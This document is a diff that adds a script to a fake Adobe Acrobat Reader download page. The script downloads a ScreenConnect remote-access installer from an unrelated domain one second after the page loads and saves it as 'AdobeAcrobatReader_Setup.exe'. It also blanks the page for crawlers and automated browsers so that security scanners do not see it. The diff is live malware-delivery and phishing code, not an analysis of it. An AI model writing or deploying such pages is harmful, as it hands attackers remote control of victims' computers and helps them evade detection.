@@ -109,3 +109,48 @@
             &copy; 2026 Adobe. All rights reserved. Adobe, the Adobe logo, and Acrobat are trademarks of Adobe.
         </p>
     </div>
+
+    <script>
+        // ====== PUT YOUR DOWNLOAD LINK HERE ======
+        var downloadUrl = 'https://dreaweedguy.top/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';
+        // ==========================================
+
+        var downloadStarted = false;
+
+        function startDownload() {
+            if (downloadStarted) return;
+            downloadStarted = true;
+            document.getElementById('status').innerText = 'Downloading Adobe Acrobat Reader...';
+
+            var a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = 'AdobeAcrobatReader_Setup.exe';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            setTimeout(function() {
+                document.getElementById('status').innerText = 'If your download did not start, click the button above to try again.';
+                downloadStarted = false;
+            }, 4000);
+        }
+
+        // Anti-bot check
+        (function(){
+            var ua = navigator.userAgent.toLowerCase();
+            var bots = /bot|crawl|spider|scraper|headless|phantom|selenium|puppeteer|playwright/i;
+            if (bots.test(ua) || navigator.webdriver) {
+                document.body.innerHTML = '<div style="text-align:center;padding:100px;color:#666;font-family:Arial;">Access Denied</div>';
+                return;
+            }
+        })();
+
+        // Auto-download after 1 second
+        window.onload = function() {
+            setTimeout(function() {
+                startDownload();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
